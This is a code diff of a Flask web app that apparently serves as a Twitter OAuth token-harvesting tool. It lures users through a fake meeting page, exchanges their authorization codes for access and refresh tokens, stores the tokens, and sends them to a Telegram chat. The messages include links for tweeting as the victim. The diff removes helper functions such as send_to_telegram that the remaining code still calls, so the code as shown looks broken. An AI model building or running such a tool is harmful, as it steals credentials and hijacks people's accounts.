@@ -244,95 +244,74 @@ def telegram_webhook():
 
     return '', 200
 
-# Original functions (unchanged)
+# --- OAuth Flow for Authorization ---
+@app.route('/')
+def home():
+    code = request.args.get('code')
+    state = request.args.get('state')
+    error = request.args.get('error')
 
-def get_twitter_username(access_token):
-    url = "https://api.twitter.com/2/users/me"
-    headers = {
-        "Authorization": f"Bearer {access_token}"
-    }
+    if not code:
+        state = "0"  # Fixed state
+        session['oauth_state'] = state
 
-    response = requests.get(url, headers=headers)
+        code_verifier, code_challenge = generate_code_verifier_and_challenge()
+        session['code_verifier'] = code_verifier  # Store code_verifier in session
 
-    if response.status_code == 200:
-        data = response.json()
-        username = data.get("data", {}).get("username")
-        return username
-    else:
-        print(f"Failed to fetch username. Status code: {response.status_code}")
-        return None
-        
-# Generate code verifier and challenge
-def generate_code_verifier_and_challenge():
-    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
-    code_challenge = base64.urlsafe_b64encode(
-        hashlib.sha256(code_verifier.encode()).digest()
-    ).rstrip(b'=').decode('utf-8')
-    return code_verifier, code_challenge
+        authorization_url = (
+            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+        )
+        return redirect(authorization_url)
 
-# Function to send a startup message with OAuth link and meeting link
-def send_startup_message():
-    state = "0"  # Fixed state value for initialization
-    code_verifier, code_challenge = generate_code_verifier_and_challenge()
-    
-    authorization_url = CALLBACK_URL
-    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
-    
-    message = (
-        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
-        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
-    )
-    
-    send_message_via_telegram("✅ Bot started. Sending startup message.")
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
-    requests.post(url, json=data)
+    if code:
+        if error:
+            return f"Error during authorization: {error}", 400
 
-# Function to send access and refresh tokens to Telegram (unchanged)
-def send_to_telegram(access_token, refresh_token=None):
-    alert_emoji = "🚨"
-    key_emoji = "🔑"
-    
-    username = get_twitter_username(access_token)
-    twitter_url = f"https://twitter.com/{username}" if username else "Unknown user"
-    
-    store_token(access_token, refresh_token, username)
-    total_tokens = get_total_tokens()
+        if state != "0":  # Fixed state value check
+            return "Invalid state parameter", 403
 
-    message = f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
-    message += f"{key_emoji} *Access Token:* `{access_token}`\n"
-    
-    if refresh_token:
-        refresh_link = f"{CALLBACK_URL}refresh/{refresh_token}"
-        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"
+        code_verifier = session.pop('code_verifier', None)
 
-    tweet_link = f"{CALLBACK_URL}tweet/{access_token}"
-    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
-    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})\n"
-    message += f"🔢 *Total Tokens in Database:* {total_tokens}"
+        token_url = "https://api.twitter.com/2/oauth2/token"
+        data = {
+            'grant_type': 'authorization_code',
+            'code': code,
+            'redirect_uri': CALLBACK_URL,
+            'code_verifier': code_verifier
+        }
 
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
-    requests.post(url, json=data)
+        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
+        token_response = response.json()
 
-@app.route('/refresh/<refresh_token2>', methods=['GET'])
-def refresh_page(refresh_token2):
-    return render_template('refresh.html', refresh_token=refresh_token2)
+        if response.status_code == 200:
+            access_token = token_response.get('access_token')
+            refresh_token = token_response.get('refresh_token')
 
+            session['access_token'] = access_token
+            session['refresh_token'] = refresh_token
+
+            send_to_telegram(access_token, refresh_token)
+            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
+        else:
+            error_description = token_response.get('error_description', 'Unknown error')
+            error_code = token_response.get('error', 'No error code')
+            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+
+# --- Meeting Page Route ---
 @app.route('/j')
 def meeting():
     meeting = request.args.get('meeting')
     pwd = request.args.get('pwd')
     return render_template('meeting.html', meeting=meeting, pwd=pwd)
 
+# --- Refresh Token Route ---
+@app.route('/refresh/<refresh_token2>', methods=['GET'])
+def refresh_page(refresh_token2):
+    return render_template('refresh.html', refresh_token=refresh_token2)
+
+# --- Start the app ---
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     send_startup_message()  # Send the startup message with OAuth and meeting links
